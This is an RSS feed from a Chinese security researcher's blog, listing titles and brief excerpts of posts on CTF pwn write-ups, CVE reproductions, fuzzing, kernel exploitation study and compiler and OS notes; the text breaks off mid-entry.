<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>blog of chuj</title><link>https://chujdk.github.io/</link><description>Recent content on blog of chuj</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><managingEditor>chujj31@gmail.com (chuj)</managingEditor><webMaster>chujj31@gmail.com (chuj)</webMaster><lastBuildDate>Fri, 31 Mar 2023 19:59:00 +0000</lastBuildDate><atom:link href="https://chujdk.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>About</title><link>https://chujdk.github.io/about.html</link><pubDate>Sun, 13 Aug 2023 00:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/about.html</guid><description>Hello, I&amp;rsquo;m chuj, a noob binary sercurity researcher.</description></item><item><title>XCTF-Final-hole-wp</title><link>https://chujdk.github.io/wp/1664.html</link><pubDate>Fri, 31 Mar 2023 19:59:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1664.html</guid><description>这次的 XCTF Final 总长 12 小时，有三道 pwn 题，一道为 Haskell 写成的 lisp 解释器，一道与 Intel sgx 有关。不过我都没怎么看，而是一直在看 hole 这道 v8 题。v8 一直在高速发展，由于</description></item><item><title>CVE-2022-34918</title><link>https://chujdk.github.io/wp/1663.html</link><pubDate>Thu, 09 Mar 2023 00:15:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1663.html</guid><description>1 netfilter/iptables/nftables 这里简述一下 netfilter 和 iptables 和 nftables 之间的关系，我对网络的了解甚少，所以在看代码的时候三者的关系给了我不少困扰。 netfilter 是内核中的软件框架，用于网络操作。它</description></item><item><title>内核堆喷学习——CVE-2021-22555</title><link>https://chujdk.github.io/pwnreview/1659.html</link><pubDate>Tue, 21 Feb 2023 21:21:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1659.html</guid><description>1 总结 触发漏洞需要 CPA_NET_ADMIN ，我们先 unshare 出自己的名称空间，把权限给自己拉满 漏洞出现在内核的 netfilter 子系统，是一个防火墙系统。用户层中，iptable 即使通过</description></item><item><title>符号执行和混合符号执行，以及一个混合符号执行引擎的实现</title><link>https://chujdk.github.io/software-testing/1655.html</link><pubDate>Wed, 19 Oct 2022 11:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/software-testing/1655.html</guid><description>上个星期我看了一下 EXE 的论文，做了一下 cs6.858 的 lab3。大一的时候其实我就接触过符号执行，但是一直很遗憾没有自己实现过。所以又花了一个周末的时间写</description></item><item><title>Sea-of-nodes 论文阅读笔记</title><link>https://chujdk.github.io/compilers/1654.html</link><pubDate>Tue, 13 Sep 2022 16:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/compilers/1654.html</guid><description>A Simple Graph-Based Intermediate Representation 论文地址。这是 Sea-of-nodes IR 提出者 Cliff Click 的论文，之前“意识流学” V8 的时候，一直搞不明白 sea of nodes 的思想是什么，也尝试的找了很多资料想学习，但是感觉</description></item><item><title>对解密某国产聊天软件聊天数据库的分析</title><link>https://chujdk.github.io/software-testing/1650.html</link><pubDate>Thu, 14 Jul 2022 17:18:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/software-testing/1650.html</guid><description>最近这段时间研究了一下怎么解密微信的加密数据库。我们知道，微信在各个平台都是加密保存用户聊天记录的，并且没有提供导出明文记录的功能，这给我们</description></item><item><title>compose-a-tetris 使用 compose API 在安卓上实现一个俄罗斯方块</title><link>https://chujdk.github.io/dev/1645.html</link><pubDate>Thu, 26 May 2022 11:26:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/dev/1645.html</guid><description>写在前面 为了应付安卓课的大作业，又写了一个俄罗斯方块。很幸运的是，确实学到了很多知识，虽然这些知识可能没什么用，但是还是非常的有意思。上一次</description></item><item><title>初探 Windows 用户态堆利用——SCTF-easyheap 和 OgeekCTF2019 babyheap wp</title><link>https://chujdk.github.io/wp/1624.html</link><pubDate>Fri, 01 Apr 2022 19:44:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1624.html</guid><description>最近这段时间学习了一下 Windows heap 利用，大致感触为 Windows 的 heap 利用比起 Linux 要繁琐许多，因为 Windows 中并没有类似于 __free_hook 这些可以劫持执行流的指针，类似于 Linux got 表的 IAT 表也是</description></item><item><title>虎符网络安全赛道 2022-pwn-vdq-WP</title><link>https://chujdk.github.io/wp/1617.html</link><pubDate>Mon, 21 Mar 2022 18:25:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1617.html</guid><description>这次比赛里面出现了一个 rust pwn，到最后只有两解。我在比赛中只解出了此题，其实难度并不大，只是漏洞点光靠代码审计难以发现。这里简单分享一下我的</description></item><item><title>D^3CTF2022-d3bpf,d3bpf-v2-WP</title><link>https://chujdk.github.io/wp/1604.html</link><pubDate>Tue, 08 Mar 2022 10:01:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1604.html</guid><description>这次的 D3 出了两道题，有些师傅觉得第二题 d3bpf-v2 是对 d3bpf 出现非预期的修补，其实并不是。两道题都是入门级的 ebpf 利用题（因为我也只是初学者不可能出的难到哪里</description></item><item><title>SUSCTF2022-PWN-WP</title><link>https://chujdk.github.io/wp/1603.html</link><pubDate>Tue, 01 Mar 2022 08:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1603.html</guid><description>这场 SUSCTF 的 pwn 题难度并不算高，我们做到凌晨一点多终于 ak 了 pwn。其中我做了 rain 这题，@xi4oyu 和学弟 @h4kuy4 一起解了 happytree 这题，然后我和 @xi4oyu 一起做了 mujs 和 k</description></item><item><title>TQLCTF2022-ezvm-WP</title><link>https://chujdk.github.io/wp/1594.html</link><pubDate>Mon, 21 Feb 2022 23:30:52 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1594.html</guid><description>上周末参加了奇安信和 Redbud 一起组织的 TQLCTF，pwn 题的质量挺高，都挺有意思的，我在比赛期间尝试做了 unbelievable_write，e</description></item><item><title>BYTECTF2021-byteview</title><link>https://chujdk.github.io/fuzzing/1589.html</link><pubDate>Mon, 20 Dec 2021 13:56:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/fuzzing/1589.html</guid><description>漏洞分析 比赛的时候分析了很久这道题，结果也没做出来，现在想想主要 C++ 逆向不熟悉。 在 new content 时，如果之前已经 new 过了，就会进 case1。 case 1u: // new content v17 =</description></item><item><title>CVE-2021-21220</title><link>https://chujdk.github.io/cve/1586.html</link><pubDate>Thu, 16 Dec 2021 14:31:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/cve/1586.html</guid><description>这是一个在今年的 pwn2own 的比赛上披露的漏洞，可以通过 v8 引擎实现任意代码执行，前天看到腾讯玄武实验室推送了 two-birds-with-one-stone-an-introduction-to-v8-and-jit-exploitation 这篇文章，介绍了这个漏洞的成因。漏洞本身</description></item><item><title>DragonCTF-noflippidy-WP</title><link>https://chujdk.github.io/wp/1570.html</link><pubDate>Mon, 29 Nov 2021 15:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1570.html</guid><description>昨天的 DragonCTF 中出现了一道改编自 DiceCTF 2021 flippidy 的题，原题是一道比较传统的堆题，此题进行了一个小 patch，想要执行原先的漏洞函数，需要满足 fs:0x28 也就是 canary 为 0。</description></item><item><title>一些没完成的题目</title><link>https://chujdk.github.io/mess/1569.html</link><pubDate>Mon, 22 Nov 2021 22:33:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1569.html</guid><description>近期参加了一些比赛，积累了一些没做出来的题，个别题感觉本身也没啥意思，还有一些，由于各种原因，可能无法完全复现，这里简单记录一下思路。 hello_jerry jerry pwn</description></item><item><title>StarCTF-OOB-WP</title><link>https://chujdk.github.io/pwnreview/1561.html</link><pubDate>Tue, 16 Nov 2021 15:50:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1561.html</guid><description>博客很久没有更新了，wp 更是很久没有发过了。主要是最近的确没有刷什么题，比赛虽然打的还算多，但是都没有做什么有收获的题，所以都没有发 wp，毕</description></item><item><title>祥云杯线下 baby_stack 中的 PAC</title><link>https://chujdk.github.io/pwnreview/1559.html</link><pubDate>Wed, 27 Oct 2021 09:00:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1559.html</guid><description>之前的祥云杯线下 AWDp 中碰到了一道 ARMv8.3 的题，题目自身有一个简单的栈溢出漏洞，所以修起来十分容易，到最后被修到每轮只有 72 分，但是直到结束也没有一支队</description></item><item><title>AFLgo 环境搭建与使用</title><link>https://chujdk.github.io/fuzzing/1556.html</link><pubDate>Wed, 06 Oct 2021 17:55:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/fuzzing/1556.html</guid><description>AFLgo 是一个很有意思的模糊器，但是环境的配置比较麻烦，我碰到了不少错误和问题，这里简单记录一下整个过程。官方文档 我的环境：全新 Ubuntu 16.04 虚拟机。（不过</description></item><item><title>以库的形式使用 LibFuzzer——使用 LibFuzzer 对 lava-M 的测试</title><link>https://chujdk.github.io/fuzzing/1552.html</link><pubDate>Sat, 02 Oct 2021 14:17:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/fuzzing/1552.html</guid><description>半个多月没有更新博客了，主要还是因为逐渐不再以刷题来学习 pwn 了，少了很多可写的东西，再加上上个月特别的忙，先是军训，训完之后就连着上课，早八到</description></item><item><title>RCTF2021-musl-WP &amp;amp;&amp;amp; 5space 2021 *CTF 2022 强网杯 2022 Musl 赛题 exp</title><link>https://chujdk.github.io/wp/1549.html</link><pubDate>Mon, 13 Sep 2021 11:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1549.html</guid><description>写在一年后 在现在向前看，发现自己也算半个 musl 大师了，自从 RCTF2021 的 musl 题之后的每场比赛只要出现 musl 我都能解出，也从最开始的写一天到现在的两三个小时打通，</description></item><item><title>COOL 语义分析器实现</title><link>https://chujdk.github.io/dev/1548.html</link><pubDate>Mon, 06 Sep 2021 01:20:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/dev/1548.html</guid><description>COOL 的语义分析主要对作用域和类型做了检测，这是两个必要的检测。未定义或重复定义的变量会对代码生成造成影响；类型不匹配也会造成各种未定义行为。 作</description></item><item><title>语法分析简单总结</title><link>https://chujdk.github.io/dev/1546.html</link><pubDate>Fri, 27 Aug 2021 22:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/dev/1546.html</guid><description>语法分析是词法分析的后一步，主要的目的就是通过词法分析器生成的 tokens 来生成抽象语法树（Abstract Syntax Tree，AST）。主要通过上下文无关文</description></item><item><title>年轻人的第一个词法分析器——COOL 的 lexer</title><link>https://chujdk.github.io/dev/1538.html</link><pubDate>Fri, 20 Aug 2021 18:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/dev/1538.html</guid><description>花了一天多的时间实现了这个词法分析器，从骨架上开始写确实可以少关心很多繁杂的小问题，体验好了许多。 词法分析是编译的第一步，做的事情就是对源代</description></item><item><title>InCTF2021-Ancienthouse/NodeKeeper-WP</title><link>https://chujdk.github.io/wp/1537.html</link><pubDate>Mon, 16 Aug 2021 11:55:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1537.html</guid><description>Ancienthouse 这道题用了 2.2.5 版本 jemalloc 作为分配器，而不是传统的 ptmalloc。jemalloc 是 Facebook 开发的一个分配器，在 Firefox 和 redis 中都有应用。据说比 ptmalloc 有更好的性能</description></item><item><title>RaRCTF-PWN-WP</title><link>https://chujdk.github.io/wp/1532.html</link><pubDate>Tue, 10 Aug 2021 10:49:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1532.html</guid><description>一场非常温暖人心的比赛，pwn 题比较简单，也是第一次在比赛里做完了 pwn 题。题目虽然挺简单，但是挺有意思的。做的虽然很累，但是体验尚可。 Archer 这题直</description></item><item><title>设计模式</title><link>https://chujdk.github.io/design-pattern/1518.html</link><pubDate>Thu, 05 Aug 2021 23:36:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/design-pattern/1518.html</guid><description>个人对设计模式的一点理解，由于没有专研于开发，可能会有不恰当之处，欢迎批评 策略模式 策略模式定义了算法族，分别封装起来，让它们之间可以互相替换</description></item><item><title>TCTF2021-uc_masteeer-WP</title><link>https://chujdk.github.io/wp/1515.html</link><pubDate>Wed, 04 Aug 2021 12:24:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1515.html</guid><description>一道 Unicorn 的题目，之前没听说过这种东西，比赛的时候看都没看，现在来学习复现一下。 关于 unicorn，在看雪上有一篇 Unicorn 在 Android 的应用 写的很详细，这里参</description></item><item><title>glibc 2.34 malloc 的变化</title><link>https://chujdk.github.io/pwnreview/1512.html</link><pubDate>Tue, 03 Aug 2021 09:58:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1512.html</guid><description>昨天突然发现 glibc 2.34 发布了，虽然偶数版本似乎一般不会发布在稳定发行版中，但是还是挺好奇的，花了几分钟看了看，发现主要的变动是取消了几个 hook。</description></item><item><title>DASCTF July X CBCTF 4th PWN WP</title><link>https://chujdk.github.io/wp/1508.html</link><pubDate>Mon, 02 Aug 2021 22:13:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1508.html</guid><description>周末打了一下 DASCTF July X CBCTF 4th 这场比赛，其实这段时间也有一个什么极客巅峰的比赛，还有一个 UIUCTF。极客巅峰错过报名了（以为是晚上十点截止），再加</description></item><item><title>PWNABLE.TW-seccomp-tools-分析</title><link>https://chujdk.github.io/mess/1506.html</link><pubDate>Fri, 30 Jul 2021 09:06:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1506.html</guid><description>有一段时间没更新博客了，一方面是被这道题卡住，另一方面也是最近比较颓废，基本上每天都在睡觉。这道题感觉已经做不出来了，所以我就把分析放在这里</description></item><item><title>seccomp 中的 bpf</title><link>https://chujdk.github.io/pwnreview/1495.html</link><pubDate>Sat, 24 Jul 2021 15:26:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1495.html</guid><description>学习这个问题的原因是想做 pwnable.tw 的 seccomp-tool 一题，此题的 elf 可以读取、模拟、加载用户输入的 bpf 代码，其中加载使用的是 prctl 系统调用，功能号为 PR_GET_SECC</description></item><item><title>CVE-2021-3493</title><link>https://chujdk.github.io/software-testing/1481.html</link><pubDate>Tue, 20 Jul 2021 19:24:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/software-testing/1481.html</guid><description>我复现的第一个 CVE，[font color=&amp;quot;#8470FF&amp;quot;]cheers！[/font] 漏洞信息，patch，pwn</description></item><item><title>Balsn_CTF_2019-KrazyNote-WP</title><link>https://chujdk.github.io/wp/1480.html</link><pubDate>Mon, 19 Jul 2021 20:57:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1480.html</guid><description>这道题的利用难度其实比较低，主要的难度在逆向上。说实话，乱七八糟的反编译代码是把我绕惨了。最近这段时间碰到了不少题目都是败在逆向上，我也意识</description></item><item><title>Jarvis OJ-HTTP-WP</title><link>https://chujdk.github.io/wp/1477.html</link><pubDate>Sun, 18 Jul 2021 22:27:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1477.html</guid><description>最开始的时候我也是想成为一个 web 手的，但是在入门的时候就被绊倒在了门槛上。近期参与的比赛中有碰到 http 服务器后门相关的 pwn 题，看起来属于难度比较低的</description></item><item><title>QWB2021-notebook-WP</title><link>https://chujdk.github.io/wp/1468.html</link><pubDate>Thu, 15 Jul 2021 23:16:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1468.html</guid><description>强网杯的时候我还一点都不会 kernel pwn，这道题看都没看。这两天尝试复现了一下，从前天下午一直弄到现在才搞出来，费了不少时间，也学到了一些东西，特</description></item><item><title>D^3CTF2019-knote-WP</title><link>https://chujdk.github.io/wp/1455.html</link><pubDate>Tue, 13 Jul 2021 17:50:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1455.html</guid><description>本博客的第 200 篇文章，[font color=&amp;quot;#FA8072&amp;quot;] cheer! [/font] 这道题是老学长 Aris 出的，借着这道题学习了一下用 userfaultfd 机制稳定条件竞争的方法。我确实还是比较菜，又是完全照着 ha1vk 师</description></item><item><title>WCTF2018-klist-WP</title><link>https://chujdk.github.io/wp/1446.html</link><pubDate>Mon, 12 Jul 2021 14:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1446.html</guid><description>本文参考自 ha1vk 师傅的linux kernel pwn学习之条件竞争(一) 借着这道题初步学习了一下 kernel 中条件竞争的利用。本题主要是通过条件竞争造成 UAF，然后通</description></item><item><title>PWNABLE.TW-Kidding-WP</title><link>https://chujdk.github.io/wp/1439.html</link><pubDate>Fri, 09 Jul 2021 21:28:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1439.html</guid><description>很久没碰过 pwnable 的题目了，这道题其实很久之前也做过了，但是当时没有服务器接反弹的 shell，所以就作罢了，今天新买了一台服务器，不需要在上面跑什</description></item><item><title>*CTF2019-hackme-WP</title><link>https://chujdk.github.io/wp/1433.html</link><pubDate>Thu, 08 Jul 2021 16:08:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1433.html</guid><description>首先看一下启动参数 qemu-system-x86_64 \ -m 256M \ -nographic \ -kernel bzImage \ -append &amp;#39;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&amp;#39; \ -monitor /dev/null \ -initrd initramfs.cpio \ -smp cores=4,threads=2 \ -cpu qemu64,smep,smap 2&amp;gt;/dev/null 开启了 kaslr 和 smep，smap。 这道题是一个堆上溢出造成的 UAF，</description></item><item><title>TCTF2021-listbook-WP</title><link>https://chujdk.github.io/wp/1431.html</link><pubDate>Mon, 05 Jul 2021 22:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1431.html</guid><description>比赛和考试周相撞，所以比赛没有好好打，整场只看了这道题，比较尴尬的是最后也没看出来漏洞点。这个漏洞点让我觉得这个位置一定是个漏洞点，但是又触</description></item><item><title>写在大一结束</title><link>https://chujdk.github.io/mess/1421.html</link><pubDate>Mon, 05 Jul 2021 15:15:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1421.html</guid><description>今天出了高代成绩，很幸运没有挂科，既然这门课没有挂那就应该就不会有挂科了，也算是有惊无险的度过了大一下。由于考试周的原因博客很久没更新了，最</description></item><item><title>操作系统导论-OSTEP 简单笔记</title><link>https://chujdk.github.io/wp/1419.html</link><pubDate>Fri, 02 Jul 2021 12:25:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1419.html</guid><description>进程介绍 homework CPU 利用率应该为 100%，因为不存在 IO 操作 需要 5 + IO 所需的时间片个时间，由于 IO 需要 4 个时间片，所以总共需要 9 个时间片 需要 max(1 + IO 所需时</description></item><item><title>ptmalloc 之 sysmalloc 分析</title><link>https://chujdk.github.io/pwnreview/1418.html</link><pubDate>Tue, 22 Jun 2021 18:07:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1418.html</guid><description>最近这段时间是考试周，所以 kernel pwn 的学习我暂时放了下来，先做一点体力活，一直不了解 ptmalloc 怎么通过系统调用增加内存池大小的，这里分析一下。、 我们知道，</description></item><item><title>强网杯2018-CORE-WP</title><link>https://chujdk.github.io/wp/1417.html</link><pubDate>Sun, 20 Jun 2021 14:53:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1417.html</guid><description>这道题是一个 KERNEL 下的 ROP，其实和用户态下的差别也不是特别大，但是调试不是很方便，有地方出现错误，基本上就会造成 qemu 的重启，会浪费很多时间。 start.sh 脚</description></item><item><title>Kernel PWN UAF 的利用和调试</title><link>https://chujdk.github.io/pwnreview/1408.html</link><pubDate>Sat, 19 Jun 2021 15:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1408.html</guid><description>进行调试，必然是 gdb attach 到 qemu 上了，在启动指令中加入 -S -gdb tcp::1234 即可启动一个调试口，在一个新的终端中打开 gdb，使用 targe remote :1234 即可 attach 上去。 光 attach 上去肯定不够，</description></item><item><title>《操作系统真像还原》简单读后感</title><link>https://chujdk.github.io/os/1407.html</link><pubDate>Fri, 18 Jun 2021 16:55:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1407.html</guid><description>花了大概一个月的时间，看了 12 章，到 13 章硬盘分区驱动这里实在是看不下去了，遂决定不再看这本书了，对其操作系统的实现也告一段落了，就停留在系统调</description></item><item><title>Kernel PWN 环境搭建</title><link>https://chujdk.github.io/pwnreview/1318.html</link><pubDate>Thu, 17 Jun 2021 21:45:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1318.html</guid><description>一直对 kernel pwn 挺感兴趣的，再加上 libc 那里也没什么新东西可学了，简单题没什么做的意义，难题也不会做，所以准备开始学习 kernel pwn。不过可能最近也没办法太</description></item><item><title>《操作系统真像还原》操作系统实现——系统调用</title><link>https://chujdk.github.io/os/1402.html</link><pubDate>Mon, 14 Jun 2021 20:46:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1402.html</guid><description>到这里，有了前面的铺垫，要说的东西不多，其实没必要单独写出来，但是系统调用毕竟还是比较重要的东西，所以这里还是单独说一下。 Linux 下的系统调用占用</description></item><item><title>2021强网杯线上赛 baby_diary [强网先锋]orw babypwn WP</title><link>https://chujdk.github.io/wp/1399.html</link><pubDate>Sun, 13 Jun 2021 21:39:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1399.html</guid><description>强网杯这次我总共做了 3 道比较简单 pwn 题，还有三道题目学长做了，之后看情况复现一下。剩下 7 道基本上不会，还是需要继续学习 baby_diary 这道题就是 2.29+ libc 的 unlink 利用</description></item><item><title>计划表</title><link>https://chujdk.github.io/mess/1398.html</link><pubDate>Fri, 11 Jun 2021 19:59:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1398.html</guid><description>[login] [goal title=&amp;ldquo;小目标&amp;rdquo;] [item check=&amp;ldquo;false&amp;rdquo;] 整理一下最近写的两个小玩具（fuse 和混合符号执行引擎 demo）的实现细节，争取写两</description></item><item><title>PWNABLE.TW-food_store-分析</title><link>https://chujdk.github.io/wp/1379.html</link><pubDate>Thu, 10 Jun 2021 23:09:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1379.html</guid><description>看了一段时间，暂时还没有找出洞，自己还是太菜了，考虑到题目的逻辑较复杂，结构体也较多，在这里先记录一下，免得到时候忘了。 程序总共有 7 个功能，</description></item><item><title>《操作系统真像还原》操作系统实现——用户进程</title><link>https://chujdk.github.io/os/1374.html</link><pubDate>Wed, 09 Jun 2021 23:35:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1374.html</guid><description>硬件生产厂商（Intel）给多进程切换提供了硬件级的解决方案，也就是使用 TSS（Task-Stat Segment），令人遗憾的是由于其效率较</description></item><item><title>《操作系统真像还原》操作系统实现——从键盘获取输入和缓冲区</title><link>https://chujdk.github.io/os/1371.html</link><pubDate>Sun, 06 Jun 2021 20:51:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1371.html</guid><description>关于键盘输入我不想写，就是一个和硬件交互的过程，这里主要还是说一下输入输出缓冲区。 代码已经打好 tag，链接，比较重要的就是 ioqueue。 获</description></item><item><title>pwn 指定程序运行时使用的 libc</title><link>https://chujdk.github.io/pwnreview/941.html</link><pubDate>Fri, 04 Jun 2021 15:29:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/941.html</guid><description>文章是一月份的时候写的了，那个时候比较稚嫩，当时并没有很好的解决这个问题，也没有写清楚，现在重写一下。 使用 patchelf 替换 假如我们有靶机的 libc，那</description></item><item><title>《操作系统真像还原》操作系统实现——线程和锁</title><link>https://chujdk.github.io/os/1359.html</link><pubDate>Thu, 03 Jun 2021 16:19:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1359.html</guid><description>这篇文章写的比较乱且简略，要看的话建议跟着代码一起看。本文代码在此处 线程和进程是操作系统的重要概念。 线程和进程的区别 这似乎是一个面试中常见的</description></item><item><title>XCTF-FINAL 2021-house of pig-WP</title><link>https://chujdk.github.io/wp/1362.html</link><pubDate>Tue, 01 Jun 2021 23:47:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1362.html</guid><description>感觉自己还是太菜了，在比赛期间甚至都没有逆清楚这道题，即使学长给了分析好的 idb 文件也看不懂。当然当时身体不是很好也有一部分原因，但是还是觉得很</description></item><item><title>DASCTF2021.5-PWN-WP</title><link>https://chujdk.github.io/wp/1360.html</link><pubDate>Sun, 30 May 2021 15:16:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1360.html</guid><description>由于有 XCTF-FINAL，所以虽然报了名，但是并没有打这场比赛，XCTF 也是零贡献，什么都不会了只好补一下 DASCTF 的题目，两题都很简单。 ticket 可以通</description></item><item><title>bluehat2021-portable-WP</title><link>https://chujdk.github.io/wp/1357.html</link><pubDate>Thu, 27 May 2021 09:46:21 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/wp/1357.html</guid><description>很久之前打的比赛了，由于调试环境没配好，一直没复现这道题，前天突发奇想手动编译了一下 qemu 发现可以调了，所以就复现了一下 主要的洞在 这里的 switch 中，没</description></item><item><title>PWN ARM 环境配置</title><link>https://chujdk.github.io/pwnreview/1353.html</link><pubDate>Tue, 25 May 2021 22:58:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1353.html</guid><description>主要使用的调试方法为：qemu + gdb-multiarch，再交叉编译得到有符号的 libc。 qemu 安装 直接通过 apt 安装并不是一个很好的选择，因为版</description></item><item><title>《操作系统真像还原》操作系统实现——内存池管理</title><link>https://chujdk.github.io/os/1349.html</link><pubDate>Tue, 25 May 2021 19:42:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1349.html</guid><description>操作系统需要管理内存页的映射，即虚拟地址和物理地址的映射关系，一种简单的方法是一对一映射，管理起来也比较方便，申请的时候填写页表，释放的时候</description></item><item><title>ptmalloc 的简单分析</title><link>https://chujdk.github.io/pwnreview/1300.html</link><pubDate>Sun, 23 May 2021 22:42:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/pwnreview/1300.html</guid><description>前言 断断续续写了一个多月，终于写完了。写本文的主要目的是获得一个对堆的理性认知，从知其然到知其所以然。主要分析了 __libc_malloc，</description></item><item><title>《操作系统真像还原》操作系统实现——中断</title><link>https://chujdk.github.io/os/1339.html</link><pubDate>Sun, 23 May 2021 00:15:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1339.html</guid><description>中断这个东西说起来不是很难，实现起来比较麻烦，主要是和硬件有一定联系，会略显复杂。 宏观视角 宏观地来看，一个中断的过程就是 CPU 接受中断信号，然后</description></item><item><title>IDA switch 在跳表结构下的修复</title><link>https://chujdk.github.io/mess/1345.html</link><pubDate>Sat, 22 May 2021 22:09:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/mess/1345.html</guid><description>今天协会打了一场内部 AWD，第一次参加这样的比赛，确实有不少手忙脚乱的地方，也有学到许多新知识。 PWN 总共有两题，其中一题虚拟机类题由于有较大的</description></item><item><title>《操作系统真像还原》操作系统实现——内核中的字符打印函数</title><link>https://chujdk.github.io/os/1336.html</link><pubDate>Thu, 20 May 2021 23:06:00 +0000</pubDate><author>chujj31@gmail.com (chuj)</author><guid>https://chujdk.github.io/os/1336.html</guid><description>昨天在看特权级相关的东西，看的云里雾里，没搞得很懂，考虑到短期之内不会弄得特别深，而且我们也用不上调用门，相关的较复杂的问题也应该不会碰到，</description></item><item><title>操作系统概念——特权级</title><link>https://chujdk.github.io/os/1335.html</link><pubDate>Wed, 19 May 2021 21:49:30 +0000</pubDate><author>chujj31@gmail.com 